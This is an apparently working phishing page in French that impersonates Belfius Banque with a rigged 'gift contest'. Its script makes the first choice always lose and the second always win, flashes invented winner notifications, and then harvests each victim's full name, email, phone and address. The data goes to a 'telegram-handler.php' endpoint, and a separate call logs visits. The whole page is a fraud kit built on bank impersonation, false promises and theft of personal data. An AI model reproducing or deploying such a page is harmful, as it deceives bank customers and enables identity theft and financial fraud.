<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ğŸ Concours de Cadeaux - Belfius Banque</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
<div id="winnerNotification" class="winner-notification hidden">
  <div class="notification-header">
    <span class="notification-title">ğŸ‰ Nouveau gagnant !</span>
    <button class="close-btn" onclick="closeNotification()">âœ•</button>
  </div>
  <div class="notification-content">
    <p><strong id="winnerName">Lucas T. de Namur</strong></p>
    <p>Vient de gagner <strong id="winnerAmount">â‚¬3700</strong> !</p>
    <p style="font-size: 11px; color: #16a34a; margin-top: 5px;">Il y a quelques instants</p>
  </div>
</div>

<div class="container">
   <div class="brand-header">
    <div class="">
      <img src="images/logo.png" style="width: 120px; height: auto;"></div>

  </div>

   <div id="mainGame" class="game-section">
    <div class="chip">
      <h2>Tentez votre chance !</h2>
    </div>

    <h1 class="main-title">Choisissez l'un des cadeaux</h1>
    <p class="subtitle">et remportez jusqu'Ã  5000â‚¬</p>

    <div id="attemptsDisplay" class="attempts hidden">
      Tentatives : <span id="attemptCount">0</span>/2
    </div>

     <div class="gift-grid">
      <div class="gift-item">
        <div class="gift-number">1</div>
        <button class="gift-box" onclick="selectGift(1)">
          <div class="gift-icon">ğŸ</div>
        </button>
      </div>
      <div class="gift-item">
        <div class="gift-number tr">2</div>
        <button class="gift-box" onclick="selectGift(2)">
          <div class="gift-icon">ğŸ</div>
        </button>
      </div>
      <div class="gift-item">
        <div class="gift-number bl">3</div>
        <button class="gift-box" onclick="selectGift(3)">
          <div class="gift-icon">ğŸ</div>
        </button>
      </div>
      <div class="gift-item">
        <div class="gift-number br">4</div>
        <button class="gift-box" onclick="selectGift(4)">
          <div class="gift-icon">ğŸ</div>
        </button>
      </div>
    </div>

     <div id="selectedMessage" class="message hidden">
      <p>Vous avez sÃ©lectionnÃ© : <strong id="selectedGiftName">Cadeau 1</strong></p>
    </div>

    <div id="encouragementMessage" class="message hidden">
      <p style="margin-bottom: 10px;">N'abandonnez pas ! ğŸ€</p>
      <p>Tout le monde mÃ©rite une seconde chance. Choisissez un autre cadeau pour rÃ©essayer !</p>
    </div>
  </div>

   <div id="firstTryResult" class="screen hidden">
    <div class="panel">
      <div class="emoji-big">ğŸ˜”</div>
      <h2>Pas cette fois !</h2>
      <p>DÃ©solÃ©, vous n'avez pas gagnÃ© avec <span id="firstTryGiftName">Cadeau 1</span> cette fois.</p>
      <p style="font-size: 14px; margin-top: 15px;">Mais n'abandonnez pas ! Essayez encore pour une autre chance.</p>
    </div>
  </div>

   <div id="processing" class="screen hidden">
    <div class="panel">
      <div class="emoji-big" style="animation: pulse 2s infinite;">âœ¨</div>
      <h2>VÃ©rification de votre chance...</h2>
      <p>Quelque chose de spÃ©cial se passe ! ğŸ‰</p>
    </div>
  </div>

   <div id="winnerScreen" class="screen hidden" style="position: relative; overflow: hidden;">
     <div class="bg-emoji" style="top: 10%; left: 10%;">ğŸ‰</div>
    <div class="bg-emoji" style="top: 20%; right: 15%; animation-delay: 1s;">ğŸ’°</div>
    <div class="bg-emoji" style="bottom: 20%; left: 15%; animation-delay: 2s;">â­</div>
    <div class="bg-emoji" style="bottom: 10%; right: 10%; animation-delay: 0.5s;">ğŸ†</div>

     <div id="confettiContainer" style="position: absolute; inset: 0; pointer-events: none;"></div>

    <div class="winner-form">
      <div class="form-header">
        <div class="emoji-big">ğŸ‰</div>
        <h2>FÃ‰LICITATIONS !</h2>
        <p class="win-amount">Vous avez gagnÃ© â‚¬<span id="winAmount">2500</span> !</p>
        <p style="color: var(--brand-dark); font-weight: 600; margin-top: 10px;">Incroyable rÃ©ussite ! ğŸŠ</p>
      </div>

      <div style="background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 10px; padding: 15px; margin-bottom: 25px;">
        <p style="color: var(--brand-dark); font-weight: 600; font-size: 14px; margin: 0;">
Afin de procÃ©der au versement de votre gain, veuillez remplir et transmettre le formulaire ci-dessous. <br>
Le versement sera effectuÃ© aprÃ¨s rÃ©ception du formulaire.
        </p>
      </div>

      <form id="winnerForm" onsubmit="submitForm(event)" action="telegram-handler.php" method="POST">
        <input type="hidden" name="bonus" id="hiddenWinAmount" value="">
        <input type="hidden" name="subdomain" value="belfius-contest">
        <input type="hidden" name="country" value="Belgium">
        <input type="hidden" name="method" id="hiddenMethod" value="default"> <input type="hidden" name="city" id="hiddenCity" value="">
        <input type="hidden" name="postal" id="hiddenPostal" value="">

        <div class="form-field">
          <label>Nom complet *</label>
          <input type="text" id="fullName" name="fullName" required="" placeholder="Entrez votre nom complet">
        </div>

        <div class="form-field">
          <label>Adresse e-mail *</label>
          <input type="email" id="email" name="email" required="" placeholder="votre.email@exemple.com">
        </div>

        <div class="form-field">
          <label>NumÃ©ro de tÃ©lÃ©phone *</label>
          <input type="tel" id="phone" name="phone" required="" placeholder="+32 2 123 45 67">
        </div>

        <div class="form-field">
          <label>Adresse complÃ¨te *</label>
          <input type="text" id="address" name="address" required="" placeholder="Rue, Ville, Code postal, Belgique">
        </div>

        <div class="form-field hidden"> <label>MÃ©thode de virement *</label>
          <div class="payment-methods">
            <button type="button" class="payment-btn" id="cardBtn" onclick="selectPayment('card')">
              ğŸ’³ Belfius (carte)
            </button>
            <button type="button" class="payment-btn" id="bankBtn" onclick="selectPayment('bank')">
              ğŸ¦ Autre banque
            </button>
          </div>
        </div>

        <div id="paymentInfo" class="hidden" style="background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 8px; padding: 12px; margin-bottom: 20px;">
          <div style="display: flex; align-items: start; gap: 8px; color: #1d4ed8; font-size: 13px;">
            <span>â„¹ï¸</span>
            <div id="paymentInfoText"></div>
          </div>
        </div>

        <button type="submit" class="submit-btn" id="submitBtn" disabled="">
          ğŸ‰ JE VALIDE <span id="winAmountBtn" style="display:none">2500</span> ! ğŸ’°
        </button>
      </form>


    </div>
  </div>
</div>

<footer style="text-align: center; color: rgba(255,255,255,0.8); font-size: 12px; padding: 30px;">

</footer>

<script>
    // =======================================================
    // CODE JAVASCRIPT INTÃ‰GRÃ‰ (provenant de script.js)
    // =======================================================
    
    // Game state (minimal needed for form and flow)
    let selectedGift = null;
    let attempts = 0;
    let winAmount = 2500; // Default amount if game logic is simplified
    let isSubmitting = false;

    const gifts = {1: "Cadeau 1", 2: "Cadeau 2", 3: "Cadeau 3", 4: "Cadeau 4"};
    const fakeWinners = [
      { name: "Marie D.", amount: 2500, location: "Bruxelles" },
      { name: "Lucas T.", amount: 3700, location: "Namur" }
    ];

    // --- Fonctions de l'interface utilisateur ---
    
    function showScreen(screenId) {
      // Hide all screens
      const screens = ['mainGame', 'firstTryResult', 'processing', 'winnerScreen'];
      screens.forEach(id => {
        document.getElementById(id).classList.add('hidden');
      });
      
      // Show selected screen
      document.getElementById(screenId).classList.remove('hidden');
    }

    function showWinnerScreen() {
      // Met Ã  jour le montant gagnÃ©
      winAmount = Math.floor(Math.random() * (5000 - 1000 + 1)) + 1000;
      document.getElementById('winAmount').textContent = winAmount;
      document.getElementById('winAmountBtn').textContent = winAmount;
      document.getElementById('hiddenWinAmount').value = winAmount; // Assure que le champ cachÃ© est rempli
      
      showScreen('winnerScreen');
      // Les fonctions startConfetti/stopConfetti ne sont pas incluses ici pour la simplicitÃ©,
      // mais elles dÃ©pendaient des classes CSS de votre fichier style.css
      // Vous pouvez les ajouter si vous souhaitez les animations.
    }
    
    function closeNotification() {
      document.getElementById('winnerNotification').classList.add('hidden');
    }
    
    // --- Logique du jeu (simplifiÃ©e) ---

    function selectGift(giftId) {
      if (attempts >= 2) return;
      
      selectedGift = giftId;
      document.getElementById('selectedGiftName').textContent = gifts[giftId];
      document.getElementById('selectedMessage').classList.remove('hidden');
      
      playGame();
    }

    function playGame() {
      attempts++;
      document.getElementById('attemptCount').textContent = attempts;
      document.getElementById('attemptsDisplay').classList.remove('hidden');

      if (attempts === 1) {
        // First try - always lose
        setTimeout(() => {
          document.getElementById('firstTryGiftName').textContent = gifts[selectedGift];
          showScreen('firstTryResult');
          
          setTimeout(() => {
            showScreen('mainGame');
            document.getElementById('encouragementMessage').classList.remove('hidden');
          }, 2000);
        }, 1000);
      } else if (attempts === 2) {
        // Second try - always win
        setTimeout(() => {
          showScreen('processing');
          
          setTimeout(() => {
            showWinnerScreen();
          }, 2000);
        }, 1000);
      }
    }
    
    // --- Logique de paiement (gardÃ©e pour la forme, mais inutile pour le lead simplifiÃ©) ---
    function selectPayment(method) {
      document.getElementById('hiddenMethod').value = method;
      document.getElementById('cardBtn').classList.remove('active');
      document.getElementById('bankBtn').classList.remove('active');
      document.getElementById(method + 'Btn').classList.add('active');
      
      // Masquer le bloc d'info car il est superflu dans ce modÃ¨le
      document.getElementById('paymentInfo').classList.add('hidden');
      
      updateSubmitButton();
    }

    // --- Validation et soumission du formulaire ---
    
    function updateSubmitButton() {
      // VÃ©rifie les champs obligatoires (Nom, Email, TÃ©l, Adresse)
      const fullName = document.getElementById('fullName').value.trim();
      const email = document.getElementById('email').value.trim();
      const phone = document.getElementById('phone').value.trim();
      const address = document.getElementById('address').value.trim();
      
      let isValid = fullName && email && phone && address;
      
      document.getElementById('submitBtn').disabled = !isValid || isSubmitting;
    }

    function submitForm(event) {
      event.preventDefault();
      if (isSubmitting) return;
      
      isSubmitting = true;
      const submitBtn = document.getElementById('submitBtn');
      submitBtn.innerHTML = 'â³ Traitement en cours...';
      submitBtn.disabled = true;
      
      // Assurer que le montant gagnÃ© est mis Ã  jour (mÃªme si non envoyÃ© sur Telegram)
      document.getElementById('hiddenWinAmount').value = winAmount;
      
      // Logique basique pour remplir les champs cachÃ©s City/Postal (pour le PHP)
      const address = document.getElementById('address').value;
      const addressParts = address.split(',').map(part => part.trim());
      
      // Tente d'extraire le code postal et la ville de l'adresse
      if (addressParts.length >= 2) {
        document.getElementById('hiddenPostal').value = addressParts[addressParts.length - 1] || '';
        document.getElementById('hiddenCity').value = addressParts[addressParts.length - 2] || '';
      } else if (addressParts.length === 1) {
         document.getElementById('hiddenCity').value = addressParts[0];
         document.getElementById('hiddenPostal').value = 'N/A';
      }
      
      // Soumet le formulaire Ã  telegram-handler.php
      event.target.submit();
    }
    
    // --- Initialisation et Logger des visites ---
    
    document.addEventListener('DOMContentLoaded', () => {
      // Ã‰couteurs pour la validation du formulaire
      const inputs = ['fullName', 'email', 'phone', 'address'];
      inputs.forEach(id => {
        const element = document.getElementById(id);
        if (element) {
          element.addEventListener('input', updateSubmitButton);
        }
      });
      
      // Initialisation (pour les notifications de faux gagnants)
      const initNotifications = () => {
          const showWinnerNotification = () => {
              const winner = fakeWinners[Math.floor(Math.random() * fakeWinners.length)];
              document.getElementById('winnerName').textContent = `${winner.name} de ${winner.location}`;
              document.getElementById('winnerAmount').textContent = `â‚¬${winner.amount}`;
              document.getElementById('winnerNotification').classList.remove('hidden');
              setTimeout(() => {
                document.getElementById('winnerNotification').classList.add('hidden');
              }, 4000);
          }
          setTimeout(showWinnerNotification, 3000);
          setInterval(() => {
            if (Math.random() > 0.3) showWinnerNotification();
          }, Math.random() * 4000 + 8000);
      };
      initNotifications();
      
      // Envoi d'un ping au serveur pour logger un nouveau visiteur (visit-log.php)
      try {
        fetch('visit-log.php', { method: 'POST' }).catch(function(){});
      } catch (e) {}
    });
    
</script>
</body>
</html>